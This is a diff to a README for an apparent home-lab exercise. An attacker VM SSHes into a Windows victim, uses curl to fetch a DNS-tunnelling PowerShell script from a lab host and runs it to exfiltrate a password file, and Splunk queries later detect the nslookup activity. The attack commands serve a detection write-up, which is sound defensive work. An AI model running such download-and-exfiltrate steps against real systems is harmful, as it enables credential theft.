@@ -14,20 +14,20 @@ Here, Virtual Windows 11 is the victim where universal forwarder is running,
 and Virtual Kali Linux is the attacker.
 - The Attack was simulated by Kali Linux on Windows as follows: 
 
-1) Attacker Login to Victim Machine via SSH and uploaded a PowerScript on it.  
+1) Attacker Login to Victim Machine via SSH and uploaded a PowerScript ![sender-dns-tunnel.ps1](<scripts/sender-dns-tunnel.ps1>) on it.  
 ```
 ssh sshuser@192.168.0.103
 ```  
 ```
-curl http://192.168.0.106/sender-dns-tunnel.ps1 -o ![sender-dns-tunnel.ps1](<scripts/sender-dns-tunnel.ps1>)
+curl http://192.168.0.106/sender-dns-tunnel.ps1 -o sender-dns-tunnel.ps1
 ```
 2) Then executed the following command to capture a file which contain sensitive passwords.  
 ```
 powershell .\sender-tunnel.ps1
 ``` 
-3) Now Attacker has started receiving many data from Victim Machine in Base64 format with the help of a python script.  
+3) Now Attacker has started receiving many data from Victim Machine in Base64 format with the help of a python script [dns_tunnel_capturer.py](<scripts/dns_tunnel_capturer.py>).  
 ```
-python3 [dns_tunnel_capturer.py](<scripts/dns_tunnel_capturer.py>)
+python3 dns-tunnel-capture.py
 ```  
 ![recived](logs/Screenshot_2025-06-03_03_29_12.png)
 
@@ -86,7 +86,8 @@ index=* EventCode=1 nslookup.exe | table CommandLine, EventCode, _time
 ![ps1](<logs/Screenshot 2025-06-03 135809.png>)  
 ![created](<logs/Screenshot 2025-06-03 135821.png>)
 
-3) After execution of the PowerShell many nslookup Command Execution was seen and it was trying to resolve an unknown Domain Name.  
+3) After execution of the PowerShell many nslookup Command Execution was seen  
+and it was trying to resolve an unknown Domain Name.  
 
 ![nslookup](<logs/Screenshot 2025-06-03 131305.png>)  
 ![logs](<logs/Screenshot 2025-06-03 131124.png>)  
